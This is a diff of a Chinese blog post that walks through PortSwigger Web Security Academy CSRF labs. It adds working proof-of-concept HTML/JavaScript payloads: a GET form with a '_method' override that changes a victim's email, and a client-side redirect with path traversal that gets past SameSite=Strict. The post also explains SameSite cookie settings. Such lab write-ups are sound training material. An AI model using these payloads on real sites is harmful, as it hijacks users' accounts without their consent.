@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308110931791.jpg">
 <meta property="article:published_time" content="2023-08-11T01:30:30.000Z">
-<meta property="article:modified_time" content="2023-08-13T03:48:19.704Z">
+<meta property="article:modified_time" content="2023-09-12T12:39:04.463Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="-burpsuite靶场 -CSRF">
 <meta name="twitter:card" content="summary_large_image">
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          4.4k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          24 分钟
+          37 分钟
         
       </span>
     
@@ -338,13 +338,46 @@
 
 
 
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308131046128.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308131046128.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
 <p>抓包发现没有token等限制</p>
 <img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308131050891.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
 
 <p>GET请求会被限制</p>
-<p>可以通过构造一个payload来发送浏览器</p>
+<p>可以通过构造一个payload来发送GET请求，然后通过覆盖伪造成post请求</p>
+<p>完成该请求的poc为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a5100ba04eca91480d38068008400d3.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11@11&quot;</span> &gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
+<p>提供poc到实验室即可完成</p>
+<p>总结：当系统不允许其他请求方式时可以尝试通过覆盖进行请求伪造</p>
+<h3 id="8-通过客户端重定向严格绕过同站点"><a href="#8-通过客户端重定向严格绕过同站点" class="headerlink" title="8.通过客户端重定向严格绕过同站点"></a>8.通过客户端重定向严格绕过同站点</h3><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171553615.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
+
+<p>网站属性SameSite&#x3D;Strict</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171556823.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">SameSite</span><span class="hljs-operator">=</span>None：允许跨站点请求携带 Cookie。通常用于支持第三方 Cookie，例如嵌入的社交媒体插件或广告跟踪。但是，使用此选项需要同时设置 Secure 属性，即只有在使用 HTTPS 连接时才会发送。<br><br><span class="hljs-attribute">SameSite</span><span class="hljs-operator">=</span>Lax：默认值。在跨站点的顶级导航（例如通过链接点击打开的新页面）中不会发送 Cookie，但在安全的跨站点 POST 请求中会发送。这样可以减少 CSRF 攻击的风险，同时在某些情况下保留了用户登录状态。<br><br><span class="hljs-attribute">SameSite</span><span class="hljs-operator">=</span>Strict：完全禁止在跨站点请求中发送 Cookie，无论请求是什么类型。这对于强制保持 Cookie 隔离，确保用户的认证信息不会在跨站点请求中泄漏非常有用。<br><br>使用 SameSite 属性有助于减少跨站点攻击的风险，并增强用户的隐私保护。但需要注意的是，SameSite 属性并不是绝对的安全措施，还需要结合其他安全策略来提高应用程序的安全<br></code></pre></td></tr></table></figure>
+
+<p>由于这一关SameSite&#x3D;Strict，因此只能寻找其他漏洞进行利用，优先寻找URL重定向</p>
+<p>发现在评论之后，会将你重定向回对应的文章并且该文章参数可控，</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171618512.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>参数可控</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171622906.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>在漏洞利用实验室</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现可以转跳</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171627145.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>看看能不能带参数跳转到改邮件页面发现可以跳转，但是跳转之后缺少了一个参数，将&amp;为%26正常</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171632112.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171633830.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>并且发现可以使用get方法进行邮件修改请求，因此就利用url跳转构造payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;https://0a9d001b04bbb27e8039bc54005800ed.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=usr%40ww.com%26submit=1&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="9-同站点通过同级域严格绕过"><a href="#9-同站点通过同级域严格绕过" class="headerlink" title="9.同站点通过同级域严格绕过"></a>9.同站点通过同级域严格绕过</h3>
                 
               </div>
             
